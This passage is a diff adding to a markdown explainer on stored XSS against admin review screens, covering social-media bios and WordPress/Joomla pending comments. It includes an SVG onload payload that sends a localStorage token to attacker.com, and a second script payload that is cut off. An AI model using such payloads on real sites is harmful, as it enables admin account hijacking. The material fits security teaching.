@@ -144,4 +144,21 @@ Continue From Real-World Examples and and append dont write from the start
 
 ### **3. User Profiles with Admin Moderation**
 - **Scenario**: A social media platform allows users to embed HTML in bios, which admins review before approval.
-- **
+- **Execution**: The attacker submits a malicious profile with a hidden XSS payload. When an admin views it, the script runs.
+- **Impact**: Admin accounts are compromised, leading to privilege escalation.
+
+**Payload Used**:
+```html
+<svg onload="fetch('https://attacker.com/hijack?data=' + localStorage.getItem('token'))">
+```
+
+---
+
+### **4. CMS Admin Panels (WordPress, Joomla)**
+- **Scenario**: A WordPress plugin stores unfiltered user comments in the database.
+- **Execution**: The payload fires when an admin reviews "pending comments" in `/wp-admin`.
+- **Impact**: Attackers gain admin access to the CMS.
+
+**Payload Used**:
+```javascript
+<script src="https
